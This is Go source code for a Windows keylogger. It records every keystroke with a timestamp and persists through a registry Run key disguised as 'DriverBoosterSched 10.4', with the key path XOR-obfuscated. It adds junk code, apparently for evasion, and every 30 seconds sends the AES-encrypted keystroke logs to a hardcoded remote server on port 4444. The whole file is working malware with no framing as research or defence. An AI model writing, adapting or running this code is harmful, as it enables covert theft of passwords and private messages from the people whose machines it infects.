package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"sync"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
	"crypto/md5"
	"crypto/sha256"
	_ "crypto/des"
	_ "compress/gzip"
)

func rd(b []byte, k byte) string {
	o := make([]byte, len(b))
	for i, v := range b {
		o[i] = v ^ k
	}
	return string(o)
}

func pk(a, b byte) byte { return a ^ b }

var zk = []byte{
	pk('S', 0x2A), pk('o', 0x2A), pk('f', 0x2A), pk('t', 0x2A),
	pk('w', 0x2A), pk('a', 0x2A), pk('r', 0x2A), pk('e', 0x2A),
	pk('\\', 0x2A), pk('M', 0x2A), pk('i', 0x2A), pk('c', 0x2A),
	pk('r', 0x2A), pk('o', 0x2A), pk('s', 0x2A), pk('o', 0x2A),
	pk('f', 0x2A), pk('t', 0x2A), pk('\\', 0x2A), pk('W', 0x2A),
	pk('i', 0x2A), pk('n', 0x2A), pk('d', 0x2A), pk('o', 0x2A),
	pk('w', 0x2A), pk('s', 0x2A), pk('\\', 0x2A), pk('C', 0x2A),
	pk('u', 0x2A), pk('r', 0x2A), pk('r', 0x2A), pk('e', 0x2A),
	pk('n', 0x2A), pk('t', 0x2A), pk('V', 0x2A), pk('e', 0x2A),
	pk('r', 0x2A), pk('s', 0x2A), pk('i', 0x2A), pk('o', 0x2A),
	pk('n', 0x2A), pk('\\', 0x2A), pk('R', 0x2A), pk('u', 0x2A),
	pk('n', 0x2A),
}

var zn = []byte{
	pk('D', 0x2A), pk('r', 0x2A), pk('i', 0x2A), pk('v', 0x2A),
	pk('e', 0x2A), pk('r', 0x2A), pk('B', 0x2A), pk('o', 0x2A),
	pk('o', 0x2A), pk('s', 0x2A), pk('t', 0x2A), pk('e', 0x2A),
	pk('r', 0x2A), pk('S', 0x2A), pk('c', 0x2A), pk('h', 0x2A),
	pk('e', 0x2A), pk('d', 0x2A), pk(' ', 0x2A), pk('1', 0x2A),
	pk('0', 0x2A), pk('.', 0x2A), pk('4', 0x2A),
}

var (
	dllUser   = syscall.NewLazyDLL("user32.dll")
	pGetAsync = dllUser.NewProc("GetAsyncKeyState")
	pGetKbSt  = dllUser.NewProc("GetKeyboardState")
	pToUni    = dllUser.NewProc("ToUnicode")
	pMapVK    = dllUser.NewProc("MapVirtualKeyW")
	dllAdvapi = syscall.NewLazyDLL("advapi32.dll")
	pRegOpen  = dllAdvapi.NewProc("RegOpenKeyExW")
	pRegSet   = dllAdvapi.NewProc("RegSetValueExW")
	pRegCls   = dllAdvapi.NewProc("RegCloseKey")
)

var (
	bm sync.Mutex
	bb []byte
)

func jnk() {
	_ = sha256.Sum256([]byte("x"))
	_ = md5.Sum([]byte("y"))
}

func jnk2() {
	var x [64]byte
	_ = x
}

func ps(s string) {
	bm.Lock()
	bb = append(bb, s...)
	bm.Unlock()
}

func pp() []byte {
	bm.Lock()
	defer bm.Unlock()
	if len(bb) == 0 {
		return nil
	}
	o := make([]byte, len(bb))
	copy(o, bb)
	bb = bb[:0]
	return o
}

func vk(v uint32) string {
	s, _, _ := pMapVK.Call(uintptr(v), 0)
	var st [256]byte
	pGetKbSt.Call(uintptr(unsafe.Pointer(&st[0])))
	var o [8]uint16
	n, _, _ := pToUni.Call(uintptr(v), s, uintptr(unsafe.Pointer(&st[0])), uintptr(unsafe.Pointer(&o[0])), uintptr(len(o)), 4)
	if int32(n) > 0 {
		return string(utf16.Decode(o[:n]))
	}
	if int32(n) < 0 {
		pToUni.Call(uintptr(v), s, 0, 0, 0, 4)
	}
	switch v {
	case 0x08:
		return "[BACK]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]\n"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x2E:
		return "[DEL]"
	}
	return ""
}

func kLoop() {
	pr := make([]bool, 256)
	for {
		time.Sleep(10 * time.Millisecond)
		for k := 8; k < 256; k++ {
			r, _, _ := pGetAsync.Call(uintptr(k))
			d := r&0x8000 != 0
			if d && !pr[k] {
				s := vk(uint32(k))
				if s != "" {
					ps(fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), s))
				}
			}
			pr[k] = d
		}
	}
}

func enc(pl, ky []byte) ([]byte, error) {
	b, err := aes.NewCipher(ky)
	if err != nil {
		return nil, err
	}
	g, err := cipher.NewGCM(b)
	if err != nil {
		return nil, err
	}
	n := make([]byte, g.NonceSize())
	if _, err = rand.Read(n); err != nil {
		return nil, err
	}
	return append(n, g.Seal(nil, n, pl, nil)...), nil
}

func sd(d []byte) {
	c, err := net.DialTimeout("tcp", fmt.Sprintf("195.0.1.5:%d", 4444), 5*time.Second)
	if err != nil {
		return
	}
	defer c.Close()
	var h [4]byte
	binary.BigEndian.PutUint32(h[:], uint32(len(d)))
	c.Write(append(h[:], d...))
}

func st() {
	e, err := os.Executable()
	if err != nil {
		return
	}
	rp, _ := syscall.UTF16PtrFromString(rd(zk, 0x2A))
	ap, _ := syscall.UTF16PtrFromString(rd(zn, 0x2A))
	eu := syscall.StringToUTF16(e)
	var hk uintptr
	rc, _, _ := pRegOpen.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(rp)), 0, uintptr(0x0002), uintptr(unsafe.Pointer(&hk)))
	if rc != 0 {
		return
	}
	defer pRegCls.Call(hk)
	pRegSet.Call(hk, uintptr(unsafe.Pointer(ap)), 0, uintptr(1), uintptr(unsafe.Pointer(&eu[0])), uintptr(len(eu)*2))
}

func sL(ky []byte) {
	for {
		time.Sleep(30 * time.Second)
		d := pp()
		if d == nil {
			continue
		}
		ec, err := enc(d, ky)
		if err != nil {
			continue
		}
		sd(ec)
	}
}

func main() {
	time.Sleep(5 * time.Second)
	jnk()
	jnk2()
	jk, _ := hex.DecodeString("30eeef8f3188373740553ac599917720c1051874af056836dee8318039077a2b")
	st()
	go sL(jk)
	kLoop()
}
